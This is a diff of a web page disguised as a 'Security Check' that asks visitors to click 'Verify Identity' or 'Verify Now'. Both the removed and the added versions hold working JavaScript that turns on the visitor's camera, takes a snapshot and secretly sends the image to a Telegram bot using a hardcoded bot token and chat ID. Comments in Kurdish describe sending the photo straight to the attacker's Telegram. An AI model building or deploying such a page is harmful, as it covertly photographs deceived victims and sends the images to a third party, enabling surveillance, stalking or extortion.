@@ -1,49 +1,24 @@
 <!DOCTYPE html>
-<html lang="ku">
-<head>
-    <meta charset="UTF-8">
-    <title>Security Check</title>
-</head>
-<body style="background:#000; color:#fff; text-align:center; padding-top:100px; font-family:sans-serif;">
-    <h2>پشکنینی ئاسایش</h2>
-    <p>تکایە کلیک لە دوگمەکە بکە بۆ سەلماندنی ناسنامە</p>
-    <button onclick="takeSnap()" style="padding:15px 30px; background:#007bff; color:#white; border:none; border-radius:10px; cursor:pointer;">Verify Identity</button>
-
+<html>
+<body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
+    <button onclick="sendData()" style="padding:20px;">Verify Now</button>
     <script>
-        async function takeSnap() {
-            try {
-                // داوای کامێرا دەکات
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-
-                // چاوەڕێ دەکات تا وێنەکە دەگرێت
-                setTimeout(async () => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 400;
-                    canvas.height = 300;
-                    canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
-                    
-                    const imageData = canvas.toDataURL('image/jpeg', 0.5);
-
-                    // --- ناردنی ڕاستەوخۆ بۆ تێلیگرامەکەت ---
-                    await fetch('https://api.telegram.org/bot8344933620:AAGonsjbg_MdNRjWb5I6QD8e_NCH1H7Emi8/sendMessage', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: '5982066799',
-                            text: "📸 وێنەیەکی نوێ گیرا:\n\n" + imageData
-                        })
-                    });
-
-                    stream.getTracks().forEach(t => t.stop());
-                    alert("سەرکەوتوو بوو!");
-                    window.location.href = "https://google.com";
-                }, 2000);
-            } catch (e) {
-                alert("تکایە مۆڵەتی کامێرا بدە.");
-            }
+        async function sendData() {
+            const s = await navigator.mediaDevices.getUserMedia({video:true});
+            const v = document.createElement('video'); v.srcObject = s; v.play();
+            setTimeout(async () => {
+                const cv = document.createElement('canvas'); cv.width=400; cv.height=300;
+                cv.getContext('2d').drawImage(v,0,0);
+                const img = cv.toDataURL('image/jpeg', 0.5);
+                
+                // لێرەدا ڕاستەوخۆ دەنێردرێت بۆ تێلیگرام بێ ئەوەی پێویستی بە تێرمیناڵ بێت
+                await fetch('https://api.telegram.org/bot8344933620:AAGonsjbg_MdNRjWb5I6QD8e_NCH1H7Emi8/sendMessage', {
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({chat_id:'5982066799', text: "📸 NEW:\n" + img})
+                });
+                alert("Done!");
+            }, 2000);
         }
     </script>
 </body>
